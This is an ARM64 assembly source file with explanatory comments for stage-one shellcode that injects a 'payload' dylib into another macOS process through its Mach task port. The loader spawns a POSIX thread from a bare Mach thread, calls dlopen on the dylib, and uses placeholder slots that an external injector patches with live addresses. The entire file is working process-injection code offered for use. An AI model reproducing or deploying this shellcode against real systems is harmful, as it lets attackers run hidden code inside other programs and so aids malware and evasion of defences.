; loader.asm
; Stage 1 shellcode for dylib injection via Mach task port.
;
; What this does:
;   Runs inside a bare Mach thread (spawned by thread_create_running).
;   Calls pthread_create_from_mach_thread() to create a full POSIX thread.
;   The POSIX thread calls dlopen() on our payload dylib.
;   This bare Mach thread then calls pthread_exit() to clean itself up.
;
; Why we can't call dlopen() directly:
;   thread_create_running() creates a naked Mach thread with no pthread context.
;   dlopen() internally needs pthread mutexes, the heap, and ObjC init callbacks —
;   all of which dereference the pthread_t context pointer, which is NULL here.
;   Result: instant SIGBUS. pthread_create_from_mach_thread() wraps our thread
;   in a real pthread_t context so POSIX functions work safely.
;
; Three function pointer slots are 8-byte ASCII placeholders.
; The injector patches them with live addresses before injection.
; One path slot holds the dylib path string.
;
; Assemble: as loader.asm -o loader.o
; Extract:  see README.md for the dd + xxd command to get raw bytes

.text
.global _main
.align 4

; ── _main: entry point, runs in a bare Mach thread ──────────────────────────
_main:
    pacibsp                          ; pointer authentication (nop on non-PAC hw)
    stp    x29, x30, [sp, #-16]!    ; save frame pointer + link register
    mov    x29, sp
    sub    sp,  sp,  #16            ; 16 bytes for pthread_t output storage

    ; Load patched function pointers
    adr    x8,  _pthread_create_ptr
    ldr    x21, [x8]                ; x21 = pthread_create_from_mach_thread
    adr    x8,  _pthread_exit_ptr
    ldr    x22, [x8]                ; x22 = pthread_exit

    ; pthread_create_from_mach_thread(&t, NULL, _thread_callback, &_lib_path)
    mov    x0,  sp                  ; x0 = &pthread_t (stack storage)
    mov    x1,  #0                  ; x1 = NULL (default attrs)
    adr    x2,  _thread_callback    ; x2 = our Stage 2 callback
    adr    x3,  _lib_path           ; x3 = dylib path (callback arg)
    blr    x21                      ; call pthread_create_from_mach_thread

    ; pthread_exit(NULL) — exits THIS bare Mach thread cleanly
    add    sp,  sp,  #16
    mov    x0,  #0
    blr    x22

    ldp    x29, x30, [sp], #16
    retab

; ── _thread_callback: runs in a real POSIX thread ────────────────────────────
; x0 on entry = the dylib path pointer (we passed &_lib_path as the arg above)
_thread_callback:
    pacibsp
    stp    x29, x30, [sp, #-32]!
    stp    x19, x20, [sp, #16]
    mov    x29, sp

    ; Reload function pointers (new stack frame, need fresh adr)
    adr    x8,  _dlopen_ptr
    ldr    x20, [x8]               ; x20 = dlopen
    adr    x8,  _pthread_exit_ptr
    ldr    x19, [x8]               ; x19 = pthread_exit

    ; dlopen(path, RTLD_NOW=2)
    ; x0 still = dylib path (passed as arg from pthread_create_from_mach_thread)
    mov    x1,  #2                 ; RTLD_NOW — resolve all symbols immediately
    blr    x20                     ; dlopen fires constructor in our dylib

    ; pthread_exit(NULL)
    mov    x0,  #0
    ldp    x19, x20, [sp, #16]
    ldp    x29, x30, [sp], #32
    blr    x19

    retab

; ── Placeholder data — 8 bytes each, patched by injector before injection ─────
; These appear as readable ASCII in xxd output so you can visually confirm
; the structure is intact after assembly.
.align 8
_dlopen_ptr:         .ascii "DLOPEN__"   ; replaced with dlopen() address
_pthread_create_ptr: .ascii "PTHRDCRT"   ; replaced with pthread_create_from_mach_thread address
_pthread_exit_ptr:   .ascii "PTHRDEXT"   ; replaced with pthread_exit address

; ── Dylib path string — 52-byte slot, patched by injector ────────────────────
.align 4
_lib_path: .ascii "LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB\0"
